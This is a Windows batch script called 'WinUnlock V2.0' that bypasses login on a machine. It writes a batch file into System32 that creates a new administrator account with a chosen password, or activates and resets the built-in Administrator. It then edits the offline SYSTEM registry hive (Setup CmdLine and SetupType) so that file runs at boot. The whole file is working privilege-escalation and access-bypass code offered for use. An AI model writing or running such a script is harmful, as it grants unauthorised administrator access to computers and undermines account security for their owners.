@echo off
::=============================================================::
:: WinUnlock V2.0 Created by Networkk                          ::
:: DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING            ::
:: MODIFYING THIS FILE MAY CORRUPT YOUR OPERATING SYSTEM       ::
:: MODIFY AT YOUR OWN RISK                                     ::
::=============================================================::
echo WinUnlock V2.0
echo Written by Networkk

echo Type 'Create' to create a new admin account
echo Type 'Reset' to activate and reset the default admin account
set /p option=""
if %option%==Create GOTO CreateFile
if %option%==Reset GOTO ResetAdmin

:CreateFile
echo @echo off > WULockV2.bat
echo username: 
set /p username=""
echo password: 
set /p password=""
echo created file
echo net user /add %username% %password% >> WULockV2.bat
echo net localgroup administrators %username% /add >> WULockV2.bat
echo cmd /k >> WULockV2.bat
move WULockV2.bat C:\Windows\System32 >nul
GOTO RegEdit

:ResetAdmin
echo @echo off > WULockV2.bat
echo net user Administrator /active:yes >> WULockV2.bat
echo net user Administrator * >> WULockV2.bat
echo cmd /k >> WULockV2.bat
move WULockV2.bat C:\Windows\System32 >nul
GOTO RegEdit

:RegEdit
reg.exe load HKLM\TempHive "C:\Windows\System32\config\SYSTEM" >nul
reg delete HKEY_LOCAL_MACHINE\TempHive\Setup /v CmdLine /f >nul
reg add HKEY_LOCAL_MACHINE\TempHive\Setup /v CmdLine /t Reg_Sz /d WULockV2.bat >nul
reg delete HKEY_LOCAL_MACHINE\TempHive\Setup /v SetupType /f >nul
reg add HKEY_LOCAL_MACHINE\TempHive\Setup /v SetupType /t REG_DWORD /d 2 >nul
reg.exe unload HKLM\TempHive >nul
echo finished
cmd /k